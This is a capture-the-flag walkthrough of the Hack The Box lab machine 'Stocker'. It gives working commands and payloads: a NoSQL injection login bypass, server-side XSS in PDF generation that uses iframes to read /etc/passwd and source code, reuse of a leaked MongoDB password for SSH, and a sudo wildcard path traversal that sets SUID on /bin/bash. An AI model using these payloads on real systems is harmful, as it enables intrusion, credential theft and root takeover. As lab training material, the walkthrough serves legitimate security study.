# Socker

| Hostname   | Difficulty |
| ---        | ---        |
|Stocker     | Easy       |

Machine IP: 10.10.10.xx :

```bash
TARGET=10.10.11.196       #Stocker IP address
ATTACKER=10.10.14.17     # attacker IP
```

## Initial Reconnaissance

### Ports and services

scan for open ports :

```shell
nmap $TARGET --open -Pn -T4
```

Result:

```text
Nmap scan report for 10.10.11.196
Host is up (0.019s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
```

Then explore these 2 ports :

```shell
nmap $TARGET -T4 -sC -sV -A -p 22,80
```

Result:

```text
Nmap scan report for 10.10.11.196
Host is up (0.019s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   18.54 ms 10.10.14.1
2   18.75 ms 10.10.11.196

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.94 seconds
```

On the HTTP service, we have a notice :

```text
|_http-title: Did not follow redirect to http://stocker.htb
```

So the hostname is `stocker.htb`, we can add it as a host definition :

```shell
echo "$TARGET    stocker.htb" >> /etc/hosts
```

### HTTP service - port 80

We can browse this web application with a browser :

```shell
firefox http://stocker.htb &
```

![](assets/web.png)

We can notice a possible user in this page :

```text
Angoose Garden, Head of IT at Stockers Ltd.
```

Let's enumerate the website. Using gobuster to enumerate files and folders is not providing any usefull entries. We can still enumerate sub domains :

```shell
wfuzz -c -H "Host: FUZZ.stocker.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hc 301 -u http://$TARGET
```

Result:

```text
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.196/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                       
=====================================================================

000000019:   302        0 L      4 W        28 Ch       "dev"                         

Total time: 10.06705
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 495.5768
```

So there is a sub-domain `dev.stocker.htb` and we can add it to our hosts definition:

```shell
echo "$TARGET    dev.stocker.htb" >> /etc/hosts
```

and we can open this address `http://dev.stocker.htb` in a web browser :

![](assets/web-dev.png)

This is login page.

We do not have any credential available, only a possible user name "Angoose Garden" from the page on [http://stocker.htb](http://stocker.htb).

SQL injection do seem to work either.

[Hacktrick: Login page](https://book.hacktricks.xyz/pentesting-web/login-bypass) suggest about "No SQL Injection authentication bypass".

Using Burpsuite repeater tool, here is the original request to POST the login form for authentication :

```text
POST /login HTTP/1.1
Host: dev.stocker.htb
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://dev.stocker.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://dev.stocker.htb/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

username=admin&password=admin
```

In URL bypass do not work, when providing a payload such as `Content-Type: application/x-www-form-urlencoded
`.

This payload is specified by the header `Content-Type: application/x-www-form-urlencoded`.
We can change this header by `Content-Type: application/json` to send a JSON payload.

With this change, providing `{"username": {"$ne": null}, "password": {"$ne": null} }` is working.

Here is the modifyed request :

```text
POST /login HTTP/1.1
Host: dev.stocker.htb
Content-Length: 57
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://dev.stocker.htb
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://dev.stocker.htb/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"username": {"$ne": null}, "password": {"$ne": null} }
```

And the response :

```text
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 15 May 2023 11:30:38 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 56
Connection: close
X-Powered-By: Express
Location: /stock
Vary: Accept
Set-Cookie: connect.sid=s%3AZdrJlJpicX2Mrkg4F7jJhKBi3RwWw8Tx.j30Hrk7PbNy7eZo%2F3SVWUPcaBbYwKFPBWSIMVITklsw; Path=/; HttpOnly

<p>Found. Redirecting to <a href="/stock">/stock</a></p>
```

This redirect to [http://dev.stocker.htb/stock](http://dev.stocker.htb/stock) :

![](assets/web_dev_stock.png)

Analysing the application behaviour, there are a few steps until to get a bill as a pdf file:

- Call to /api/products to get a JSON containing all the items caracteristics (name, description, price, id, etc.)
- the cart is composed on the browser side
- when placing the order, the browser call /api/order with all the items in the cart (a list of JSON objects, extracted from the result of /api/products)
- as a response, we have an OrderId
- This orderId can be used th then call `/api/po//<OrderId>` to get the bill as a PDF file

A call to /.api/products return a JSON object (always the same):

```json
[{"_id":"638f116eeb060210cbd83a8d","title":"Cup","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0},{"_id":"638f116eeb060210cbd83a8f","title":"Bin","description":"It's a rubbish bin.","image":"bin.jpg","price":76,"currentStock":15,"__v":0},{"_id":"638f116eeb060210cbd83a91","title":"Axe","description":"It's an axe.","image":"axe.jpg","price":12,"currentStock":21,"__v":0},{"_id":"638f116eeb060210cbd83a93","title":"Toilet Paper","description":"It's toilet paper.","image":"toilet-paper.jpg","price":0.69,"currentStock":4212,"__v":0}]
```

Make an order with a call to /api/order, with data:

```JSON
{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"Cup","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1},{"_id":"638f116eeb060210cbd83a8f","title":"Bin","description":"It's a rubbish bin.","image":"bin.jpg","price":76,"currentStock":15,"__v":0,"amount":1}]}
```

response is the OrderId:

```json
{"success":true,"orderId":"64621a2cebf9850adf30ea8c"}
```

Finally get the PDF with the browser :

http://dev.stocker.htb/api/po/64621a2cebf9850adf30ea8c

While analysing how this application run, it appears that the "title" field send in the call to /api/order is used.

For example, changing the title from "Axe" to "My Powed axe" will be reported in the PDF:

![](assets/web_altered_order.png)

We can also analyse this PDF to get some meta data :

```shell
exiftool /root/Downloads/64621a2cebf9850adf30ea8c.pdf
```

Result:

```text
ExifTool Version Number         : 12.16
File Name                       : 64621a2cebf9850adf30ea8c.pdf
Directory                       : /root/Downloads
File Size                       : 39 KiB
File Modification Date/Time     : 2023:05:15 13:42:46+02:00
File Access Date/Time           : 2023:05:15 13:43:03+02:00
File Inode Change Date/Time     : 2023:05:15 13:42:52+02:00
File Permissions                : rw-rw----
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Tagged PDF                      : Yes
Creator                         : Chromium
Producer                        : Skia/PDF m108
Create Date                     : 2023:05:15 11:40:38+00:00
Modify Date                     : 2023:05:15 11:40:38+00:00
```

So this PDF is generated by Skia/PDF m108. 

From [skia homepage](https://skia.org/docs/user/sample/pdf/), we find this is a graphics library used in the Chrome browser, which has a PDF backend - so probably printing a website to PDF from Chrome.

Since this is a website to PDF print, it should be possible to exploit is as a Server Side XSS.

### Information founds

| port | service | Software/version |
| ---  | ---     | ---              |
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) |
| 80   | HTTP    | nginx 1.18.0 (Ubuntu) |

## Initial access

### Exploitation

We can start by scripting it all : login, cart, order, and get the PDF

```shell
# login, get a cookie session
curl -q -X POST -d  '      
{"username": {"$ne": null}, "password": {"$ne": null} }' http://dev.stocker.htb/login -H 'Content-Type: application/json' --cookie-jar cookies.txt

# We use the Axe product in the cart (from /api/products) :
# {"_id":"638f116eeb060210cbd83a91","title":"Axe","description":"It's an axe.","image":"axe.jpg","price":12,"currentStock":21,"__v":0}
curl -q -X POST -H 'Content-Type: application/json' -b cookies.txt -d '{"basket":[{"_id":"638f116eeb060210cbd83a91","title":"My Pwn3d Axe","description":"It s an axe.","image":"axe.jpg","price":12,"currentStock":21,"__v":0,"amount":1}]}' http://dev.stocker.htb/api/order -o order.txt

# in order .txt, we have the order ID :
# {"success":true,"orderId":"646282deebf9850adf30eab4"}
OrderId=$(grep -Eo '[0-9a-z]{24}' order.txt)

# get the resulting PDF
curl -q http://dev.stocker.htb/api/po/$OrderId -o bill.pdf
```

From [Server Side XSS (Dynamic PDF)](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf), there a lot of possibilities.

Modifying the script to use a single line payload :

```shell
Payload='<iframe src=file:///etc/passwd></iframe>'

# login, get a cookie session
curl -q -X POST -d  '      
{"username": {"$ne": null}, "password": {"$ne": null} }' http://dev.stocker.htb/login -H 'Content-Type: application/json' --cookie-jar cookies.txt

# We use the Axe product in the cart (from /api/products) :
# {"_id":"638f116eeb060210cbd83a91","title":"Axe","description":"It's an axe.","image":"axe.jpg","price":12,"currentStock":21,"__v":0}
curl -q -X POST -H 'Content-Type: application/json' -b cookies.txt -d '{"basket":[{"_id":"638f116eeb060210cbd83a91","title":"'$Payload'","description":"It s an axe.","image":"axe.jpg","price":12,"currentStock":21,"__v":0,"amount":1}]}' http://dev.stocker.htb/api/order -o order.txt

# in order .txt, we have the order ID :
# {"success":true,"orderId":"646282deebf9850adf30eab4"}
OrderId=$(grep -Eo '[0-9a-z]{24}' order.txt)

# get the resulting PDF
curl -q http://dev.stocker.htb/api/po/$OrderId -o bill.pdf
```

we have a result :

![](assets/web_altered_order_passwd.png)

The exploit is working, we can get information on the server, but we can't have all the file. We can try to have a wider frame to get it all:

```shell
Payload='<iframe src=file:///etc/passwd height=1200px width=600px></iframe>'
```

With this payload, the bill is on 2 pages, but we can have the whole file :

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System
(admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network
Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd
Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time
Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
landscape:x:109:116::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
fwupd-refresh:x:112:119:fwupd-refresh
user,,,:/run/systemd:/usr/sbin/nologin
mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

The users "angoose" and "mongodb" seems interesting :

```text
mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
```

During the network service enumeration, we found that there was nginx on stocker.htb, do we can start by having its configuration. This can be usefull to get information on the running application :

```text
Payload='<iframe src=file:///var/www/index.php height=1050px width=1200px></iframe>'
```

The width and height have bee adjusted in order to get the maximum of information.

```text
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
    worker_connections 768;
    # multi_accept on;
}
http {
    ##
    # Basic Settings
    ##

    sendfile on;
    tcp_nopush on;
    tcp_nodelay on;
    keepalive_timeout 65;
    types_hash_max_size 2048;
    # server_tokens off;
    
    # server_names_hash_bucket_size 64;
    # server_name_in_redirect off;
    
    include /etc/nginx/mime.types;
    default_type application/octet-stream;
    
    ##
    # SSL Settings
    ##
    
    ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
    ssl_prefer_server_ciphers on;
    
    ##
    # Logging Settings
    ##
    
    access_log /var/log/nginx/access.log;
    error_log /var/log/nginx/error.log;
    
    ##
    # Gzip Settings
    ##
    
    gzip on;
    
    # gzip_vary on;
    # gzip_proxied any;
    # gzip_comp_level 6;
    # gzip_buffers 16 8k;
    # gzip_http_version 1.1;
    # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/java
    
    ##
    # Virtual Host Configs
    ##
    
    include /etc/nginx/conf.d/*.conf;
    
    server {
        listen 80;
        
        root /var/www/dev;
        index index.html index.htm index.nginx-debian.html;
        
        server_name dev.stocker.htb;
```

So for dev.stocker.htb, the aplication root is /var/www/dev

We can try to get application source code, in order to get any other valuable information. Usually the main page is named "index.php" for a php application, "index.asp" or with other extensions depending on the web technology. On this Linux host, we can check for :

- index.html
- index.php
- index.js

This last one will get a source code :

```
Payload='<iframe src=file:///var/www/dev/index.js height=1050px width=1200px></iframe>'
```

![](assets/web-dev-code.png)

```js
const express = require("express");
const mongoose = require("mongoose");
const session = require("express-session");
const MongoStore = require("connect-mongo");
const path = require("path");
const fs = require("fs");
const { generatePDF, formatHTML } = require("./pdf.js");
const { randomBytes, createHash } = require("crypto");

const app = express();
const port = 3000;

// TODO: Configure loading from dotenv for production
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(
    session({
        secret: randomBytes(32).toString("hex"),
        resave: false,
        saveUninitialized: true,
        store: MongoStore.create({
            mongoUrl: dbURI,
        }),
    })
);
app.use("/static", express.static(__dirname + "/assets"));

app.get("/", (req, res) => {
    return res.redirect("/login");
});

app.get("/api/products", async (req, res) => {
    if (!req.session.user) return res.json([]);
    
    const products = await mongoose.model("Product").find();
    return res.json(products);
});

app.get("/login", (req, res) => {
    if (req.session.user) return res.redirect("/stock");
    
    return res.sendFile(__dirname + "/templates/login.html");
});

app.post("/login", async (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) return res.redirect("/login?error=login-error");

    // TODO: Implement hashing

    const user = await mongoose.model("User").findOne({ username, password });
    
    if (!user) return res.redirect("/login?error=login-error");
    
    req.session.user = user.id;
    
    console.log(req.session);
    
    return res.redirect("/stock");
});

app.post("/api/order", async (req, res) => {
    if (!req.session.user) return res.json({});

    if (!req.body.basket) return res.json({ success: false });
```
So we have a user and password for mongo DB :

| username  | password  | usage |
| ---       | ---       | ---   |
| dev       | IHeardPassphrasesArePrettySecure | MongoDB |

MongoDB is not exposed on network. We can still reuse this credential on SSH as it is accessible on the network.

### Maintaining access

Knowing a few user names (especially from /etc/passwd), we can have access to user "angoose", reusing this password :

```shell
ssh angoose@stocker.htb 
```

result:

```text
angoose@stocker.htb's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

angoose@stocker:~$ 
```

## Post-Exploitation

### Host Reconnaissance

```shell
sudo -l
```

result:

```text
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

So we can execute node.js script in folder /usr/local/scripts/ :

```shell
ls -l /usr/local/scripts/
```

```text
total 32
drwxr-xr-x  3 root root 4096 Dec  6 10:33 .
drwxr-xr-x 11 root root 4096 Dec  6 10:33 ..
-rwxr-x--x  1 root root  245 Dec  6 09:53 creds.js
-rwxr-x--x  1 root root 1625 Dec  6 09:53 findAllOrders.js
-rwxr-x--x  1 root root  793 Dec  6 09:53 findUnshippedOrders.js
drwxr-xr-x  2 root root 4096 Dec  6 10:33 node_modules
-rwxr-x--x  1 root root 1337 Dec  6 09:53 profitThisMonth.js
-rwxr-x--x  1 root root  623 Dec  6 09:53 schema.js
```

Theses scripts will request the DB server to output tables regarding the orders. But there are not usable for us.

### Privilege Escalation

Since we can execute a script /usr/local/scripts/*.js as sudo, we can use a directory traversal to execute any js script.

create a file /tmp/xploit.js (found exeample [here](https://stackabuse.com/executing-shell-commands-with-node-js/)) :

```js
const { exec } = require("child_process");
exec("chmod +s /bin/bash");
```

Execute as :

```shell
sudo /usr/bin/node /usr/local/scripts/../../../tmp/xploit.js
```

Check that /bin/bash have the SUID bit set :

```shell
ls -l /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

execute :

```shell
/bin/bash -p
```
